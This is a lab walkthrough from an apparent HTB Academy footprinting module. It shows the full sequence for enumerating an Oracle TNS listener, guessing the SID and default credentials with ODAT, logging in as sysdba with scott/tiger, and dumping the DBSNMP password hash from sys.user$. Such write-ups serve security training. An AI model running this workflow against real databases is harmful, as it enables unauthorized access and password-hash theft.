## HTB Academy — Oracle TNS Footprinting

**Module:** Footprinting  
**Task:** Enumerate the target Oracle database and retrieve the DBSNMP password hash

---
### Enumeration

#### Port Scan
```bash
sudo nmap -p1521 -sV 10.129.16.88 --open
```

**Result:** Port 1521 open, Oracle TNS listener 11.2.0.2.0
#### SID Discovery
```bash
python3 odat.py sidguesser -s 10.129.16.88 -p 1521
```

**Result:** SID `XE` identified
#### Credential Discovery
```bash
python3 odat.py passwordguesser -s 10.129.16.88 -p 1521 -d XE --accounts-file accounts/accounts_multiple.txt
```

**Result:** Valid credentials found — `scott / tiger`

---
### Exploitation
#### Connect as sysdba
```bash
./sqlplus scott/tiger@10.129.16.88/XE as sysdba
```

#### Extract DBSNMP hash
```sql
SELECT name, password FROM sys.user$ WHERE name='DBSNMP';
```

**Result:**
```
DBSNMP    E066D214D5421CCC
```

---

### Key Lessons Learned
- **Use TCP VPN on HTB**, not UDP — Oracle TNS is sensitive to packet loss and UDP causes timeouts with ODAT and sqlplus
- ODAT's `sidguesser` can return false positives — always verify with `XE` first for Oracle Express
- `scott/tiger` is a classic default Oracle credential worth trying before brute-forcing
- Connecting `as sysdba` escalates privileges and allows querying `sys.user$` for password hashes

---

### Why TCP and not UDP?
Oracle TNS uses **TCP** natively for reliable, ordered communication — it needs guaranteed delivery since database queries can't afford lost packets. UDP offers no delivery guarantees, so over a VPN tunnel with any packet loss, TNS connections drop or time out entirely. Switching to a TCP-based VPN tunnel eliminates that problem.
